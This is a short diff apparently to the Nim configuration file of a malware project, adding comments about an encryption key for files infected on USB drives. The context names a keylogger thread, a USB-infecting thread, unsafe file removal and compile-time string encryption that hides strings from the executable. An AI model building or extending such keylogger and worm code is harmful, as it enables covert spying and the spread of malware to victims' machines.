@@ -2,7 +2,6 @@
 ## used by the program
 
 ## used for compile-time string encryption
-
 from functions/hideString import e
 
 ## keyloggerThread is used for logging key presses
@@ -23,7 +22,9 @@ const UNSAFE_REMOVE_FILE*: bool = true
 ## infectThread will search for usb drives and infect them
 const USE_INFECT_THREAD*: bool = false
 
-##
+## the key files on a usb drive will be infected with
+## add e before " to encrypt the key so it can't be read
+## from the executable
 const INFECT_ENCRYPTION_KEY*: string = e"abiestezeulmeu1"
 
 ## TODO: IMPLEMENT THE FOLLOWING LINES
